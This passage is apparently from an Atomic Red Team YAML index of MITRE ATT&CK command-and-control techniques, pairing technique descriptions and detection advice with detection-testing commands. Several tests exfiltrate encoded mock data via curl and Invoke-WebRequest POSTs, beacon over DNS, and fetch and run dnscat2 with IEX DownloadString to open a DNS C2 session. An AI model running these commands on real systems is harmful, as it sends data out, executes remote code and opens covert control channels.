command-and-control:
  T1205.002:
    technique:
      modified: '2022-10-20T19:56:18.579Z'
      name: Socket Filters
      description: |-
        Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.

        To establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)

        Filters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: persistence
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: 'Identify running processes with raw sockets. Ensure processes
        listed have a need for an open raw socket and are in accordance with enterprise
        policy.(Citation: crowdstrike bpf socket filters)'
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_is_subtechnique: true
      x_mitre_deprecated: false
      x_mitre_domains:
      - enterprise-attack
      x_mitre_version: '1.0'
      x_mitre_contributors:
      - Tim (Wadhwa-)Brown
      - CrowdStrike
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'Network Traffic: Network Connection Creation'
      type: attack-pattern
      id: attack-pattern--005cc321-08ce-4d17-b1ea-cb5275926520
      created: '2022-09-30T21:18:41.930Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1205/002
        external_id: T1205.002
      - source_name: exatrack bpf filters passive backdoors
        description: 'ExaTrack. (2022, May 11). Tricephalic Hellkeeper: a tale of
          a passive backdoor. Retrieved October 18, 2022.'
        url: https://exatrack.com/public/Tricephalic_Hellkeeper.pdf
      - source_name: crowdstrike bpf socket filters
        description: 'Jamie Harries. (2022, May 25). Hunting a Global Telecommunications
          Threat: DecisiveArchitect and Its Custom Implant JustForFun. Retrieved October
          18, 2022.'
        url: https://www.crowdstrike.com/blog/how-to-hunt-for-decisivearchitect-and-justforfun-implant/
      - source_name: Leonardo Turla Penquin May 2020
        description: Leonardo. (2020, May 29). MALWARE TECHNICAL INSIGHT TURLA â€œPenquin_x64â€?.
          Retrieved March 11, 2021.
        url: https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf
      - source_name: haking9 libpcap network sniffing
        description: 'Luis Martin Garcia. (2008, February 1). Hakin9 Issue 2/2008
          Vol 3 No.2 VoIP Abuse: Storming SIP Security. Retrieved October 18, 2022.'
        url: http://recursos.aldabaknocking.com/libpcapHakin9LuisMartinGarcia.pdf
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1132.001:
    technique:
      modified: '2023-03-03T00:31:33.071Z'
      name: 'Data Encoding: Standard Encoding'
      description: 'Adversaries may encode data with a standard data encoding system
        to make the content of command and control traffic more difficult to detect.
        Command and control (C2) information can be encoded using a standard data
        encoding system that adheres to existing protocol specifications. Common data
        encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation:
        Wikipedia Binary-to-text Encoding)(Citation: Wikipedia Character Encoding)
        Some data encoding systems may also result in data compression, such as gzip.'
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: 'Analyze network data for uncommon data flows (e.g., a client
        sending significantly more data than it receives from a server). Processes
        utilizing the network that do not normally have network communication or have
        never been seen before are suspicious. Analyze packet contents to detect communications
        that do not follow the expected protocol behavior for the port that is being
        used.(Citation: University of Birmingham C2)'
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_is_subtechnique: true
      x_mitre_deprecated: false
      x_mitre_domains:
      - enterprise-attack
      x_mitre_version: '1.0'
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      type: attack-pattern
      id: attack-pattern--04fd5427-79c7-44ea-ae13-11b24778ff1c
      created: '2020-03-14T23:36:52.095Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1132/001
        external_id: T1132.001
      - source_name: University of Birmingham C2
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
      - source_name: Wikipedia Binary-to-text Encoding
        description: Wikipedia. (2016, December 26). Binary-to-text encoding. Retrieved
          March 1, 2017.
        url: https://en.wikipedia.org/wiki/Binary-to-text_encoding
      - source_name: Wikipedia Character Encoding
        description: Wikipedia. (2017, February 19). Character Encoding. Retrieved
          March 1, 2017.
        url: https://en.wikipedia.org/wiki/Character_encoding
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1132.001
    atomic_tests:
    - name: Base64 Encoded data.
      auto_generated_guid: 1164f70f-9a88-4dff-b9ff-dc70e7bf0c25
      description: 'Utilizing a common technique for posting base64 encoded data.

        '
      supported_platforms:
      - macos
      - linux
      input_arguments:
        destination_url:
          description: Destination URL to post encoded data.
          type: url
          default: redcanary.com
        base64_data:
          description: Encoded data to post using fake Social Security number 111-11-1111.
          type: string
          default: MTExLTExLTExMTE=
      executor:
        command: |
          echo -n 111-11-1111 | base64
          curl -XPOST #{base64_data}.#{destination_url}
        name: sh
    - name: XOR Encoded data.
      auto_generated_guid: c3ed6d2a-e3ad-400d-ad78-bbfdbfeacc08
      description: |
        XOR encodes the data with a XOR key.
        Reference - https://gist.github.com/loadenmb/8254cee0f0287b896a05dcdc8a30042f
      supported_platforms:
      - windows
      input_arguments:
        destination_url:
          description: Destination URL to post encoded data.
          type: url
          default: example.com
        plaintext:
          description: Plain text mimicking victim data sent to C2 server.
          type: string
          default: Path\n----\nC:\Users\victim
        key:
          description: XOR key used for encoding the plaintext.
          type: string
          default: abcdefghijklmnopqrstuvwxyz123456
      executor:
        command: |
          $plaintext = ([system.Text.Encoding]::UTF8.getBytes("#{plaintext}"))
          $key = "#{key}"
          $cyphertext =  @();
          for ($i = 0; $i -lt $plaintext.Count; $i++) {
           $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];
          }
          $cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)
          [System.Net.ServicePointManager]::Expect100Continue = $false
          Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive
        name: powershell
  T1568.002:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Ryan Benson, Exabeam
      - Barry Shteiman, Exabeam
      - Sylvain Gil, Exabeam
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--118f61a5-eb3e-4fb6-931f-2096647f4ecd
      type: attack-pattern
      created: '2020-03-10T17:44:59.787Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1568.002
        url: https://attack.mitre.org/techniques/T1568/002
      - source_name: Cybereason Dissecting DGAs
        url: http://go.cybereason.com/rs/996-YZT-709/images/Cybereason-Lab-Analysis-Dissecting-DGAs-Eight-Real-World-DGA-Variants.pdf
        description: 'Sternfeld, U. (2016). Dissecting Domain Generation Algorithms:
          Eight Real World DGA Variants. Retrieved February 18, 2019.'
      - source_name: Cisco Umbrella DGA
        url: https://umbrella.cisco.com/blog/2016/10/10/domain-generation-algorithms-effective/
        description: Scarfo, A. (2016, October 10). Domain Generation Algorithms â€“
          Why so effective?. Retrieved February 18, 2019.
      - source_name: Unit 42 DGA Feb 2019
        url: https://unit42.paloaltonetworks.com/threat-brief-understanding-domain-generation-algorithms-dga/
        description: 'Unit 42. (2019, February 7). Threat Brief: Understanding Domain
          Generation Algorithms (DGA). Retrieved February 19, 2019.'
      - url: http://blog.talosintelligence.com/2017/09/avast-distributes-malware.html
        description: 'Brumaghin, E. et al. (2017, September 18). CCleanup: A Vast
          Number of Machines at Risk. Retrieved March 9, 2018.'
        source_name: Talos CCleanup 2017
      - source_name: Akamai DGA Mitigation
        url: https://blogs.akamai.com/2018/01/a-death-match-of-domain-generation-algorithms.html
        description: Liu, H. and Yuzifovich, Y. (2018, January 9). A Death Match of
          Domain Generation Algorithms. Retrieved February 18, 2019.
      - url: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html
        description: Dunwoody, M.. (2017, April 3). Dissecting One of APT29â€™s Fileless
          WMI and PowerShell Backdoors (POSHSPY). Retrieved April 5, 2017.
        source_name: FireEye POSHSPY April 2017
      - source_name: ESET Sednit 2017 Activity
        url: https://www.welivesecurity.com/2017/12/21/sednit-update-fancy-bear-spent-year/
        description: 'ESET. (2017, December 21). Sednit update: How Fancy Bear Spent
          the Year. Retrieved February 18, 2019.'
      - source_name: Data Driven Security DGA
        url: https://datadrivensecurity.info/blog/posts/2014/Oct/dga-part2/
        description: 'Jacobs, J. (2014, October 2). Building a DGA Classifier: Part
          2, Feature Engineering. Retrieved February 18, 2019.'
      - source_name: Pace University Detecting DGA May 2017
        url: http://csis.pace.edu/~ctappert/srd2017/2017PDF/d4.pdf
        description: Chen, L., Wang, T.. (2017, May 5). Detecting Algorithmically
          Generated Domains Using Data Visualization and N-Grams Methods . Retrieved
          April 26, 2019.
      - source_name: Elastic Predicting DGA
        url: https://arxiv.org/pdf/1611.00791.pdf
        description: Ahuja, A., Anderson, H., Grant, D., Woodbridge, J.. (2016, November
          2). Predicting Domain Generation Algorithms with Long Short-Term Memory
          Networks. Retrieved April 26, 2019.
      modified: '2022-03-11T18:26:23.432Z'
      name: Domain Generation Algorithms
      description: |-
        Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)

        DGAs can take the form of apparently random or â€œgibberishâ€? strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)

        Adversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: |-
        Detecting dynamically generated domains can be challenging due to the number of different DGA algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There is a myriad of approaches for detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more.(Citation: Data Driven Security DGA) CDN domains may trigger these detections due to the format of their domain names. In addition to detecting a DGA domain based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.

        Machine learning approaches to detecting DGA domains have been developed and have seen success in applications. One approach is to use N-Gram methods to determine a randomness score for strings used in the domain name. If the randomness score is high, and the domains are not whitelisted (CDN, etc), then it may be determined if a domain is related to a legitimate host or DGA.(Citation: Pace University Detecting DGA May 2017) Another approach is to use deep learning to classify domains as DGA-generated.(Citation: Elastic Predicting DGA)
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Flow'
      x_mitre_permissions_required:
      - User
    atomic_tests: []
  T1071.004:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Jan Petrov, Citi
      - Chris Heald
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--1996eef1-ced3-4d7f-bf94-33298cabbf72
      created: '2020-03-15T16:27:31.768Z'
      x_mitre_version: '1.1'
      external_references:
      - source_name: mitre-attack
        external_id: T1071.004
        url: https://attack.mitre.org/techniques/T1071/004
      - source_name: Medium DnsTunneling
        url: https://medium.com/@galolbardes/learn-how-easy-is-to-bypass-firewalls-using-dns-tunneling-and-also-how-to-block-it-3ed652f4a000
        description: Galobardes, R. (2018, October 30). Learn how easy is to bypass
          firewalls using DNS tunneling (and also how to block it). Retrieved March
          15, 2020.
      - source_name: University of Birmingham C2
        url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
      - source_name: PAN DNS Tunneling
        url: https://www.paloaltonetworks.com/cyberpedia/what-is-dns-tunneling
        description: Palo Alto Networks. (n.d.). What Is DNS Tunneling?. Retrieved
          March 15, 2020.
      x_mitre_deprecated: false
      revoked: false
      description: "Adversaries may communicate using the Domain Name System (DNS)
        application layer protocol to avoid detection/network filtering by blending
        in with existing traffic. Commands to the remote system, and often the results
        of those commands, will be embedded within the protocol traffic between the
        client and server. \n\nThe DNS protocol serves an administrative function
        in computer networking and thus may be very common in environments. DNS traffic
        may also be allowed even before network authentication is completed. DNS packets
        contain many fields and headers in which data can be concealed. Often known
        as DNS tunneling, adversaries may abuse DNS to communicate with systems under
        their control within a victim network while also mimicking normal, expected
        traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling) "
      modified: '2022-06-17T13:52:03.232Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: 'Application Layer Protocol: DNS'
      x_mitre_detection: |-
        Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)

        Monitor for DNS traffic to/from known-bad or suspicious domains.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_is_subtechnique: true
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      - 'Network Traffic: Network Traffic Flow'
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1071.004
    atomic_tests:
    - name: DNS Large Query Volume
      auto_generated_guid: 1700f5d6-5a44-487b-84de-bc66f507b0a6
      description: |
        This test simulates an infected host sending a large volume of DNS queries to a command and control server.
        The intent of this test is to trigger threshold based detection on the number of DNS queries either from a single source system or to a single targe domain.
        A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.
      supported_platforms:
      - windows
      input_arguments:
        query_type:
          description: DNS query type
          type: string
          default: TXT
        subdomain:
          description: Subdomain prepended to the domain name
          type: string
          default: atomicredteam
        query_volume:
          description: Number of DNS queries to send
          type: integer
          default: 1000
        domain:
          description: Default domain to simulate against
          type: string
          default: 127.0.0.1.xip.io
      executor:
        command: 'for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type
          "#{query_type}" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}"
          -QuickTimeout}

          '
        name: powershell
    - name: DNS Regular Beaconing
      auto_generated_guid: 3efc144e-1af8-46bb-8ca2-1376bb6db8b6
      description: |
        This test simulates an infected host beaconing via DNS queries to a command and control server at regular intervals over time.
        This behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.
        A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.
      supported_platforms:
      - windows
      input_arguments:
        runtime:
          description: Time in minutes to run the simulation
          type: integer
          default: 30
        domain:
          description: Default domain to simulate against
          type: string
          default: 127.0.0.1.xip.io
        subdomain:
          description: Subdomain prepended to the domain name
          type: string
          default: atomicredteam
        query_type:
          description: DNS query type
          type: string
          default: TXT
        c2_interval:
          description: Seconds between C2 requests to the command and control server
          type: integer
          default: 30
        c2_jitter:
          description: Percentage of jitter to add to the C2 interval to create variance
            in the times between C2 requests
          type: integer
          default: 20
      executor:
        command: |
          Set-Location PathToAtomicsFolder
          .\T1071.004\src\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
        name: powershell
    - name: DNS Long Domain Query
      auto_generated_guid: fef31710-223a-40ee-8462-a396d6b66978
      description: |
        This test simulates an infected host returning data to a command and control server using long domain names.
        The simulation involves sending DNS queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DNS queries for long domain names over a set threshold.
         Upon execution, DNS information about the domain will be displayed for each callout.
      supported_platforms:
      - windows
      input_arguments:
        query_type:
          description: DNS query type
          type: string
          default: TXT
        subdomain:
          description: Subdomain prepended to the domain name (should be 63 characters
            to test maximum length)
          type: string
          default: atomicredteamatomicredteamatomicredteamatomicredteamatomicredte
        domain:
          description: Default domain to simulate against
          type: string
          default: 127.0.0.1.xip.io
      executor:
        command: |
          Set-Location PathToAtomicsFolder
          .\T1071.004\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}
        name: powershell
    - name: DNS C2
      auto_generated_guid: e7bf9802-2e78-4db9-93b5-181b7bcd37d7
      description: |
        This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.
        The following blogs have more information.

        https://github.com/iagox86/dnscat2

        https://github.com/lukebaggett/dnscat2-powershell
      supported_platforms:
      - windows
      input_arguments:
        domain:
          description: Domain Name configured to use DNS Server where your C2 listener
            is running
          type: string
          default: example.com
        server_ip:
          description: IP address of DNS server where your C2 listener is running
          type: string
          default: 127.0.0.1
      executor:
        command: |
          IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
          Start-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}
        name: powershell
  T1172:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Matt Kelly, @breakersall
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--1ce03c65-5946-4ac9-9d4d-66db87e024bd
      type: attack-pattern
      created: '2018-01-16T16:13:52.465Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1172
        url: https://attack.mitre.org/techniques/T1172
      - url: http://www.icir.org/vern/papers/meek-PETS-2015.pdf
        description: David Fifield, Chang Lan, Rod Hynes, Percy Wegmann, and Vern
          Paxson. (2015). Blocking-resistant communication through domain fronting.
          Retrieved November 20, 2017.
        source_name: Fifield Blocking Resistent Communication through domain fronting
          2015
      modified: '2020-03-14T23:29:54.083Z'
      name: Domain Fronting
      description: |-
        Domain fronting takes advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) The technique involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, "domainless" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).

        For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: 'If SSL inspection is in place or the traffic is not encrypted,
        the Host field of the HTTP header can be checked if it matches the HTTPS SNI
        or against a blacklist or whitelist of domain names. (Citation: Fifield Blocking
        Resistent Communication through domain fronting 2015)'
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1573.001:
    technique:
      x_mitre_platforms:
      - Linux
      - Windows
      - macOS
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--24bfaeba-cb0d-4525-b3dc-507c77ecec41
      type: attack-pattern
      created: '2020-03-16T15:45:17.032Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1573.001
        url: https://attack.mitre.org/techniques/T1573/001
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2020-03-26T21:25:37.306Z'
      name: Symmetric Cryptography
      description: Adversaries may employ a known symmetric encryption algorithm to
        conceal command and control traffic rather than relying on any inherent protections
        provided by a communication protocol. Symmetric encryption algorithms use
        the same key for plaintext encryption and ciphertext decryption. Common symmetric
        encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: |-
        With symmetric encryption, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.

        In general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
    atomic_tests: []
  T1568.001:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--29ba5a15-3b7b-4732-b817-65ea8f6468e6
      type: attack-pattern
      created: '2020-03-11T14:11:16.560Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1568.001
        url: https://attack.mitre.org/techniques/T1568/001
      - url: https://resources.infosecinstitute.com/fast-flux-networks-working-detection-part-1/#gref
        description: Mehta, L. (2014, December 17). Fast Flux Networks Working and
          Detection, Part 1. Retrieved March 6, 2017.
        source_name: MehtaFastFluxPt1
      - source_name: MehtaFastFluxPt2
        description: Mehta, L. (2014, December 23). Fast Flux Networks Working and
          Detection, Part 2. Retrieved March 6, 2017.
        url: https://resources.infosecinstitute.com/fast-flux-networks-working-detection-part-2/#gref
      - source_name: Fast Flux - Welivesecurity
        url: https://www.welivesecurity.com/2017/01/12/fast-flux-networks-work/
        description: 'Albors, Josep. (2017, January 12). Fast Flux networks: What
          are they and how do they work?. Retrieved March 11, 2020.'
      modified: '2020-03-27T16:10:37.183Z'
      name: Fast Flux DNS
      description: |-
        Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.(Citation: MehtaFastFluxPt1)(Citation: MehtaFastFluxPt2)(Citation: Fast Flux - Welivesecurity)

        The simplest, "single-flux" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.(Citation: Fast Flux - Welivesecurity)

        In contrast, the "double-flux" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: In general, detecting usage of fast flux DNS is difficult
        due to web traffic load balancing that services client requests quickly. In
        single flux cases only IP addresses change for static domain names. In double
        flux cases, nothing is static. Defenders such as domain registrars and service
        providers are likely in the best position for detection.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Flow'
      - 'Network Traffic: Network Connection Creation'
    atomic_tests: []
  T1071:
    technique:
      modified: '2023-04-11T14:35:41.468Z'
      name: Application Layer Protocol
      description: "Adversaries may communicate using OSI application layer protocols
        to avoid detection/network filtering by blending in with existing traffic.
        Commands to the remote system, and often the results of those commands, will
        be embedded within the protocol traffic between the client and server. \n\nAdversaries
        may utilize many different protocols, including those used for web browsing,
        transferring files, electronic mail, or DNS. For connections that occur internally
        within an enclave (such as those between a proxy or pivot node and other nodes),
        commonly used protocols are SMB, SSH, or RDP. "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_contributors:
      - Duane Michael
      x_mitre_deprecated: false
      x_mitre_detection: 'Analyze network data for uncommon data flows (e.g., a client
        sending significantly more data than it receives from a server). Processes
        utilizing the network that do not normally have network communication or have
        never been seen before are suspicious. Analyze packet contents to detect application
        layer protocols that do not follow the expected protocol standards regarding
        syntax, structure, or any other variable adversaries could leverage to conceal
        data.(Citation: University of Birmingham C2)'
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '2.1'
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      - 'Network Traffic: Network Traffic Flow'
      type: attack-pattern
      id: attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6
      created: '2017-05-31T21:30:56.776Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1071
        external_id: T1071
      - source_name: University of Birmingham C2
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1024:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--3b3cbbe0-6ed3-4334-b543-3ddfd8c5642d
      type: attack-pattern
      created: '2017-05-31T21:30:31.197Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1024
        url: https://attack.mitre.org/techniques/T1024
      - url: https://blog.f-secure.com/wp-content/uploads/2019/10/CosmicDuke.pdf
        description: F-Secure Labs. (2014, July). COSMICDUKE Cosmu with a twist of
          MiniDuke. Retrieved July 3, 2014.
        source_name: F-Secure Cosmicduke
      - url: https://www.fidelissecurity.com/sites/default/files/FTA_1018_looking_at_the_sky_for_a_dark_comet.pdf
        description: Fidelis Cybersecurity. (2015, August 4). Looking at the Sky for
          a DarkComet. Retrieved April 5, 2016.
        source_name: Fidelis DarkComet
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2021-07-20T21:57:36.046Z'
